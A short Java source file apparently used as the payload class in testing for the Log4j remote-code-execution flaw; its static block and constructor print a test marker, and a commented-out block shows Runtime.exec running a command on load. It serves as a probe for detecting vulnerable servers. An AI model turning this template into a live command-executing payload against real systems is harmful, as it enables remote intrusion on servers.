public class Log4jRCE {

    static {
        System.out.println("GK7_LOG4J_RCE_TEST");
//        try {
//            String[] cmd = {"code"};
//            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    public Log4jRCE(){
        System.out.println("GK7_LOG4J_RCE_TEST");
    }
}
